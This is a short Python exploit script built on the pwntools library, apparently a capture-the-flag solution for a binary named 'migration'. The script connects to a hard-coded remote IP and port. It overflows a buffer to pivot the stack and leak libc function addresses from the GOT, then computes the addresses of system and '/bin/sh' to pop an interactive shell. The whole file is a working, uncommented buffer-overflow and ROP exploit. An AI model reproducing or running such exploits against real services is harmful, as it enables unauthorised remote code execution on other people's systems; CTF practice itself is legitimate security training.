#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = False

c = 0
pwn_file = "./migration"
elf = ELF(pwn_file)
if debug:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 2127)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    gdbcmd = '''
    b *0x8048505
    c
    '''

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'

context.log_level ='debug'
main_start = p32(0x80484ab)

# print libc
c.recvuntil('Try your best :\n')
new_ebp = p32(0x0804a900)
c.send(b'A' * (0x2c - 4) + new_ebp + p32(0x80484ea) + p32(elf.got['read']+1) + main_start)
lib_addrs = b'\0' + c.recvn(4 * 3 - 1) # read, exit, puts
read_addr = u32(lib_addrs[0:4])
exit_addr = u32(lib_addrs[4:8])
puts_addr = u32(lib_addrs[8:12])

print(hex(read_addr), hex(puts_addr))

# get shell
system_addr = puts_addr - 0x24f00
sh_addr = system_addr + 0x120d5b
c.send(b'A' * (0x2c - 4) + b'ebpp' + p32(system_addr) + p32(sh_addr) + p32(sh_addr))


c.interactive()
c.close()

